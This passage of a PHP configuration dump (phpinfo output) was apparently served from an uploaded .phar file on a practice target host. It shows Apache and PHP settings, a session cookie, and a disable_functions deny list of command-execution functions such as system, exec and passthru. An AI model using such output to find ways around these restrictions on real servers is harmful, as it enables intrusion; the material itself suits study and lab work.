WNbeRTwV7WYHBVwFQfbwKb7vOUjiYAiKVT1PczXqCLD/n5UbuLcNxTKoCgExSFNmsFCHI6iJBQFnUbqqbWPHyFceDAOrC/oPpIN+FVaVLrNUa6dLPbvoEQdO4pd1OUylBVkCutsOkqosbNvwcE6qL6g+0hG3MY4ejots1pT3kE4P9QDdfuLKeDfHswD6gu6j2TF2yQcLoqEGurre9EdP1QTfmxJRdn0NlrvD+jmY69Egz+UQvxfgAEALJ4EcRDa/toAAAAASUVORK5CYII=" alt="Zend logo" /></a>
This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Engine&nbsp;v3.4.0,&nbsp;Copyright&nbsp;(c)&nbsp;Zend&nbsp;Technologies<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;Zend&nbsp;OPcache&nbsp;v7.4.33,&nbsp;Copyright&nbsp;(c),&nbsp;by&nbsp;Zend&nbsp;Technologies<br /></td></tr>
</table>
<hr />
<h1>Configuration</h1>
<h2><a name="module_apache2handler">apache2handler</a></h2>
<table>
<tr><td class="e">Apache Version </td><td class="v">Apache/2.4.55 (Ubuntu) </td></tr>
<tr><td class="e">Apache API Version </td><td class="v">20120211 </td></tr>
<tr><td class="e">Server Administrator </td><td class="v">webmaster@localhost </td></tr>
<tr><td class="e">Hostname:Port </td><td class="v">127.0.1.1:80 </td></tr>
<tr><td class="e">User/Group </td><td class="v">www-data(33)/33 </td></tr>
<tr><td class="e">Max Requests </td><td class="v">Per Child: 0 - Keep Alive: on - Max Per Connection: 100 </td></tr>
<tr><td class="e">Timeouts </td><td class="v">Connection: 300 - Keep-Alive: 5 </td></tr>
<tr><td class="e">Virtual Server </td><td class="v">Yes </td></tr>
<tr><td class="e">Server Root </td><td class="v">/etc/apache2 </td></tr>
<tr><td class="e">Loaded Modules </td><td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">engine</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">last_modified</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xbithack</td><td class="v">0</td><td class="v">0</td></tr>
</table>
<h2>Apache Environment</h2>
<table>
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">HTTP_HOST </td><td class="v">10.10.11.241:8080 </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">Mozilla/5.0 </td></tr>
<tr><td class="e">HTTP_ACCEPT </td><td class="v">text/html,application/xhtml+xml,application/xml </td></tr>
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn </td></tr>
<tr><td class="e">HTTP_CONNECTION </td><td class="v">close </td></tr>
<tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin </td></tr>
<tr><td class="e">SERVER_SIGNATURE </td><td class="v">&lt;address&gt;Apache/2.4.55 (Ubuntu) Server at 10.10.11.241 Port 8080&lt;/address&gt;
 </td></tr>
<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.4.55 (Ubuntu) </td></tr>
<tr><td class="e">SERVER_NAME </td><td class="v">10.10.11.241 </td></tr>
<tr><td class="e">SERVER_ADDR </td><td class="v">192.168.5.2 </td></tr>
<tr><td class="e">SERVER_PORT </td><td class="v">8080 </td></tr>
<tr><td class="e">REMOTE_ADDR </td><td class="v">10.10.14.236 </td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
<tr><td class="e">REQUEST_SCHEME </td><td class="v">http </td></tr>
<tr><td class="e">CONTEXT_PREFIX </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">CONTEXT_DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
<tr><td class="e">SERVER_ADMIN </td><td class="v">webmaster@localhost </td></tr>
<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/html/uploads/phpinfo.phar </td></tr>
<tr><td class="e">REMOTE_PORT </td><td class="v">64252 </td></tr>
<tr><td class="e">GATEWAY_INTERFACE </td><td class="v">CGI/1.1 </td></tr>
<tr><td class="e">SERVER_PROTOCOL </td><td class="v">HTTP/1.1 </td></tr>
<tr><td class="e">REQUEST_METHOD </td><td class="v">GET </td></tr>
<tr><td class="e">QUERY_STRING </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">REQUEST_URI </td><td class="v">/uploads/phpinfo.phar </td></tr>
<tr><td class="e">SCRIPT_NAME </td><td class="v">/uploads/phpinfo.phar </td></tr>
</table>
<h2>HTTP Headers Information</h2>
<table>
<tr class="h"><th colspan="2">HTTP Request Headers</th></tr>
<tr><td class="e">HTTP Request </td><td class="v">GET /uploads/phpinfo.phar HTTP/1.1 </td></tr>
<tr><td class="e">Host </td><td class="v">10.10.11.241:8080 </td></tr>
<tr><td class="e">User-Agent </td><td class="v">Mozilla/5.0 </td></tr>
<tr><td class="e">Accept </td><td class="v">text/html,application/xhtml+xml,application/xml </td></tr>
<tr><td class="e">Cookie </td><td class="v">PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn </td></tr>
<tr><td class="e">Connection </td><td class="v">close </td></tr>
<tr class="h"><th colspan="2">HTTP Response Headers</th></tr>
</table>
<h2><a name="module_calendar">calendar</a></h2>
<table>
<tr><td class="e">Calendar support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_core">Core</a></h2>
<table>
<tr><td class="e">PHP Version </td><td class="v">7.4.33 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">allow_url_fopen</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">allow_url_include</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">arg_separator.input</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">arg_separator.output</td><td class="v">&amp;</td><td class="v">&amp;</td></tr>
<tr><td class="e">auto_append_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">auto_globals_jit</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">auto_prepend_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">browscap</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">default_charset</td><td class="v">UTF-8</td><td class="v">UTF-8</td></tr>
<tr><td class="e">default_mimetype</td><td class="v">text/html</td><td class="v">text/html</td></tr>
<tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">disable_functions</td><td class="v">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec</td><td class="v">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec</td></tr>
<tr><td class="e">display_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">display_startup_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">doc_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_ext</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">docref_root</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">enable_dl</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">enable_post_data_reading</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">error_append_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_prepend_string</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">error_reporting</td><td class="v">22527</td><td class="v">22527</td></tr>
<tr><td class="e">expose_php</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">extension_dir</td><td class="v">/usr/lib/php/20190902</td><td class="v">/usr/lib/php/20190902</td></tr>
<tr><td class="e">file_uploads</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">hard_timeout</td><td class="v">2</td><td class="v">2</td></tr>
<tr><td class="e">highlight.comment</td><td class="v"><font style="color: #FF8000">#FF8000</font></td><td class="v"><font style="color: #FF8000">#FF8000</font></td></tr>
<tr><td class="e">highlight.default</td><td class="v"><font style="color: #0000BB">#0000BB</font></td><td class="v"><font style="color: #0000BB">#0000BB</font></td></tr>
<tr><td class="e">highlight.html</td><td class="v"><font style="color: #000000">#000000</font></td><td class="v"><font style="color: #000000">#000000</font></td></tr>
<tr><td class="e">highlight.keyword</td><td class="v"><font style="color: #007700">#007700</font></td><td class="v"><font style="color: #007700">#007700</font></td></tr>
<tr><td class="e">highlight.string</td><td class="v"><font style="color: #DD0000">#DD0000</font></td><td class="v"><font style="color: #DD0000">#DD0000</font></td></tr>
<tr><td class="e">html_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">ignore_repeated_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_repeated_source</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">implicit_flush</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">include_path</td><td class="v">.:/usr/share/php</td><td class="v">.:/usr/share/php</td></tr>
<tr><td class="e">input_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">log_errors</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">log_errors_max_len</td><td class="v">1024</td><td class="v">1024</td></tr>
<tr><td class="e">mail.add_x_header</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mail.force_extra_parameters</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mail.log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">max_execution_time</td><td class="v">30</td><td class="v">30</td></tr>
<tr><td class="e">max_file_uploads</td><td class="v">20</td><td class="v">20</td></tr>
<tr><td class="e">max_input_nesting_level</td><td class="v">64</td><td class="v">64</td></tr>
<tr><td class="e">max_input_time</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">max_input_vars</td><td class="v">1000</td><td class="v">1000</td></tr>
<tr><td class="e">max_multipart_body_parts</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">memory_limit</td><td class="v">128M</td><td class="v">128M</td></tr>
<tr><td class="e">open_basedir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_buffering</td><td class="v">4096</td><td class="v">4096</td></tr>
<tr><td class="e">output_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">post_max_size</td><td class="v">8M</td><td class="v">8M</td></tr>
<tr><td class="e">precision</td><td class="v">14</td><td class="v">14</td></tr>
<tr><td class="e">realpath_cache_size</td><td class="v">4096K</td><td class="v">4096K</td></tr>
<tr><td class="e">realpath_cache_ttl</td><td class="v">120</td><td class="v">120</td></tr>
<tr><td class="e">register_argc_argv</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">report_memleaks</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">report_zend_debug</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">request_order</td><td class="v">GP</td><td class="v">GP</td></tr>
<tr><td class="e">sendmail_from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">sendmail_path</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i</td></tr>
<tr><td class="e">serialize_precision</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">short_open_tag</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">SMTP</td><td class="v">localhost</td><td class="v">localhost</td></tr>
<tr><td class="e">smtp_port</td><td class="v">25</td><td class="v">25</td></tr>
<tr><td class="e">sys_temp_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">syslog.facility</td><td class="v">LOG_USER</td><td class="v">LOG_USER</td></tr>
<tr><td class="e">syslog.filter</td><td class="v">no-ctrl</td><td class="v">no-ctrl</td></tr>
<tr><td class="e">syslog.ident</td><td class="v">php</td><td class="v">php</td></tr>
<tr><td class="e">track_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">unserialize_callback_func</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">upload_max_filesize</td><td class="v">2M</td><td class="v">2M</td></tr>
<tr><td class="e">upload_tmp_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">user_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">user_ini.cache_ttl</td><td class="v">300</td><td class="v">300</td></tr>
<tr><td class="e">user_ini.filename</td><td class="v">.user.ini</td><td class="v">.user.ini</td></tr>
<tr><td class="e">variables_order</td><td class="v">GPCS</td><td class="v">GPCS</td></tr>
<tr><td class="e">xmlrpc_error_number</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xmlrpc_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">zend.assertions</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">zend.detect_unicode</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.enable_gc</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.exception_ignore_args</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.multibyte</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">zend.script_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">zend.signal_check</td><td class="v">Off</td><td class="v">Off</td></tr>
</table>
<h2><a name="module_ctype">ctype</a></h2>
<table>
<tr><td class="e">ctype functions </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_date">date</a></h2>
<table>
<tr><td class="e">date/time support </td><td class="v">enabled </td></tr>
<tr><td class="e">timelib version </td><td class="v">2018.04 </td></tr>
<tr><td class="e">&quot;Olson&quot; Timezone Database Version </td><td class="v">0.system </td></tr>
<tr><td class="e">Timezone Database </td><td class="v">internal </td></tr>
<tr><td class="e">Default timezone </td><td class="v">UTC </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">date.default_latitude</td><td class="v">31.7667</td><td class="v">31.7667</td></tr>
<tr><td class="e">date.default_longitude</td><td class="v">35.2333</td><td class="v">35.2333</td></tr>
<tr><td class="e">date.sunrise_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.sunset_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.timezone</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_exif">exif</a></h2>
<table>
<tr><td class="e">EXIF Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Supported EXIF Version </td><td class="v">0220 </td></tr>
<tr><td class="e">Supported filetypes </td><td class="v">JPEG, TIFF </td></tr>
<tr><td class="e">Multibyte decoding support using mbstring </td><td class="v">disabled </td></tr>
<tr><td class="e">Extended EXIF tag formats </td><td class="v">Canon, Casio, Fujifilm, Nikon, Olympus, Samsung, Panasonic, DJI, Sony, Pentax, Minolta, Sigma, Foveon, Kyocera, Ricoh, AGFA, Epson </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">exif.decode_jis_intel</td><td class="v">JIS</td><td class="v">JIS</td></tr>
<tr><td class="e">exif.decode_jis_motorola</td><td class="v">JIS</td><td class="v">JIS</td></tr>
<tr><td class="e">exif.decode_unicode_intel</td><td class="v">UCS-2LE</td><td class="v">UCS-2LE</td></tr>
<tr><td class="e">exif.decode_unicode_motorola</td><td class="v">UCS-2BE</td><td class="v">UCS-2BE</td></tr>
<tr><td class="e">exif.encode_jis</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">exif.encode_unicode</td><td class="v">ISO-8859-15</td><td class="v">ISO-8859-15</td></tr>
</table>
<h2><a name="module_ffi">FFI</a></h2>
<table>
<tr class="h"><th>FFI support</th><th>enabled</th></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">ffi.enable</td><td class="v">preload</td><td class="v">preload</td></tr>
<tr><td class="e">ffi.preload</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_fileinfo">fileinfo</a></h2>
<table>
<tr><td class="e">fileinfo support </td><td class="v">enabled </td></tr>
<tr><td class="e">libmagic </td><td class="v">537 </td></tr>
</table>
<h2><a name="module_filter">filter</a></h2>
<table>
<tr><td class="e">Input Validation and Filtering </td><td class="v">enabled </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">filter.default</td><td class="v">unsafe_raw</td><td class="v">unsafe_raw</td></tr>
<tr><td class="e">filter.default_flags</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_ftp">ftp</a></h2>
<table>
<tr><td class="e">FTP support </td><td class="v">enabled </td></tr>
<tr><td class="e">FTPS support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_gettext">gettext</a></h2>
<table>
<tr><td class="e">GetText Support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_hash">hash</a></h2>
<table>
<tr><td class="e">hash support </td><td class="v">enabled </td></tr>
<tr><td class="e">Hashing Engines </td><td class="v">md2 md4 md5 sha1 sha224 sha256 sha384 sha512/224 sha512/256 sha512 sha3-224 sha3-256 sha3-384 sha3-512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost gost-crypto adler32 crc32 crc32b crc32c fnv132 fnv1a32 fnv164 fnv1a64 joaat haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5  </td></tr>
</table>
<table>
<tr><td class="e">MHASH support </td><td class="v">Enabled </td></tr>
<tr><td class="e">MHASH API Version </td><td class="v">Emulated Support </td></tr>
</table>
<h2><a name="module_iconv">iconv</a></h2>
<table>
<tr><td class="e">iconv support </td><td class="v">enabled </td></tr>
<tr><td class="e">iconv implementation </td><td class="v">glibc </td></tr>
<tr><td class="e">iconv library version </td><td class="v">2.37 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">iconv.input_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">iconv.internal_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">iconv.output_encoding</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_json">json</a></h2>
<table>
<tr><td class="e">json support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_libxml">libxml</a></h2>
<table>
<tr><td class="e">libXML support </td><td class="v">active </td></tr>
<tr><td class="e">libXML Compiled Version </td><td class="v">2.9.14 </td></tr>
<tr><td class="e">libXML Loaded Version </td><td class="v">20914 </td></tr>
<tr><td class="e">libXML streams </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_mysqli">mysqli</a></h2>
<table>
<tr class="h"><th>MysqlI Support</th><th>enabled</th></tr>
<tr><td class="e">Client API library version </td><td class="v">mysqlnd 7.4.33 </td></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Inactive Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">mysqli.allow_local_infile</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mysqli.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mysqli.default_host</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_port</td><td class="v">3306</td><td class="v">3306</td></tr>
<tr><td class="e">mysqli.default_pw</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_socket</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysqli.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysqli.reconnect</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mysqli.rollback_on_cached_plink</td><td class="v">Off</td><td class="v">Off</td></tr>
</table>
<h2><a name="module_mysqlnd">mysqlnd</a></h2>
<table>
<tr class="h"><th>mysqlnd</th><th>enabled</th></tr>
<tr><td class="e">Version </td><td class="v">mysqlnd 7.4.33 </td></tr>
<tr><td class="e">Compression </td><td class="v">supported </td></tr>
<tr><td class="e">core SSL </td><td class="v">supported </td></tr>
<tr><td class="e">extended SSL </td><td class="v">supported </td></tr>
<tr><td class="e">Command buffer size </td><td class="v">4096 </td></tr>
<tr><td class="e">Read buffer size </td><td class="v">32768 </td></tr>
<tr><td class="e">Read timeout </td><td class="v">86400 </td></tr>
<tr><td class="e">Collecting statistics </td><td class="v">Yes </td></tr>
<tr><td class="e">Collecting memory statistics </td><td class="v">No </td></tr>
<tr><td class="e">Tracing </td><td class="v">n/a </td></tr>
<tr><td class="e">Loaded plugins </td><td class="v">mysqlnd,debug_trace,auth_plugin_mysql_native_password,auth_plugin_mysql_clear_password,auth_plugin_caching_sha2_password,auth_plugin_sha256_password </td></tr>
<tr><td class="e">API Extensions </td><td class="v">mysqli,pdo_mysql </td></tr>
</table>
<h2><a name="module_openssl">openssl</a></h2>
<table>
<tr><td class="e">OpenSSL support </td><td class="v">enabled </td></tr>
<tr><td class="e">OpenSSL Library Version </td><td class="v">OpenSSL 3.0.8 7 Feb 2023 </td></tr>
<tr><td class="e">OpenSSL Header Version </td><td class="v">OpenSSL 3.0.2 15 Mar 2022 </td></tr>
<tr><td class="e">Openssl default config </td><td class="v">/usr/lib/ssl/openssl.cnf </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">openssl.cafile</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">openssl.capath</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_pcre">pcre</a></h2>
<table>
<tr><td class="e">PCRE (Perl Compatible Regular Expressions) Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PCRE Library Version </td><td class="v">10.42 2022-12-11 </td></tr>
<tr><td class="e">PCRE Unicode Version </td><td class="v">14.0.0 </td></tr>
<tr><td class="e">PCRE JIT Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PCRE JIT Target </td><td class="v">x86 64bit (little endian + unaligned) </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">pcre.backtrack_limit</td><td class="v">1000000</td><td class="v">1000000</td></tr>
<tr><td class="e">pcre.jit</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">pcre.recursion_limit</td><td class="v">100000</td><td class="v">100000</td></tr>
</table>
<h2><a name="module_pdo">PDO</a></h2>
<table>
<tr class="h"><th>PDO support</th><th>enabled</th></tr>
<tr><td class="e">PDO drivers </td><td class="v">mysql </td></tr>
</table>
<h2><a name="module_pdo_mysql">pdo_mysql</a></h2>
<table>
<tr class="h"><th>PDO Driver for MySQL</th><th>enabled</th></tr>
<tr><td class="e">Client API version </td><td class="v">mysqlnd 7.4.33 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">pdo_mysql.default_socket</td><td class="v">/var/run/mysqld/mysqld.sock</td><td class="v">/var/run/mysqld/mysqld.sock</td></tr>
</table>
<h2><a name="module_phar">Phar</a></h2>
<table>
<tr class="h"><th>Phar: PHP Archive support</th><th>enabled</th></tr>
<tr><td class="e">Phar API version </td><td class="v">1.1.1 </td></tr>
<tr><td class="e">Phar-based phar archives </td><td class="v">enabled </td></tr>
<tr><td class="e">Tar-based phar archives </td><td class="v">enabled </td></tr>
<tr><td class="e">ZIP-based phar archives </td><td class="v">enabled </td></tr>
<tr><td class="e">gzip compression </td><td class="v">enabled </td></tr>
<tr><td class="e">bzip2 compression </td><td class="v">disabled (install ext/bz2) </td></tr>
<tr><td class="e">Native OpenSSL support </td><td class="v">enabled </td></tr>
</table>
<table>
<tr class="v"><td>
Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br />Phar fully realized by Gregory Beaver and Marcus Boerger.<br />Portions of tar implementation Copyright (c) 2003-2009 Tim Kientzle.</td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">phar.cache_list</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">phar.readonly</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">phar.require_hash</td><td class="v">On</td><td class="v">On</td></tr>
</table>
<h2><a name="module_posix">posix</a></h2>
<table>
<tr><td class="e">POSIX support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_readline">readline</a></h2>
<table>
<tr class="h"><th>Readline Support</th><th>enabled</th></tr>
<tr><td class="e">Readline library </td><td class="v">EditLine wrapper </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">cli.pager</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">cli.prompt</td><td class="v">\b&nbsp;\&gt;&nbsp;</td><td class="v">\b&nbsp;\&gt;&nbsp;</td></tr>
</table>
<h2><a name="module_reflection">Reflection</a></h2>
<table>
<tr><td class="e">Reflection </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_session">session</a></h2>
<table>
<tr><td class="e">Session Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Registered save handlers </td><td class="v">files user  </td></tr>
<tr><td class="e">Registered serializer handlers </td><td class="v">php_serialize php php_binary  </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">session.auto_start</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.cache_expire</td><td class="v">180</td><td class="v">180</td></tr>
<tr><td class="e">session.cache_limiter</td><td class="v">nocache</td><td class="v">nocache</td></tr>
<tr><td class="e">session.cookie_domain</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.cookie_httponly</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.cookie_lifetime</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.cookie_path</td><td class="v">/</td><td class="v">/</td></tr>
<tr><td class="e">session.cookie_samesite</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.cookie_secure</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.gc_divisor</td><td class="v">1000</td><td class="v">1000</td></tr>
<tr><td class="e">session.gc_maxlifetime</td><td class="v">1440</td><td class="v">1440</td></tr>
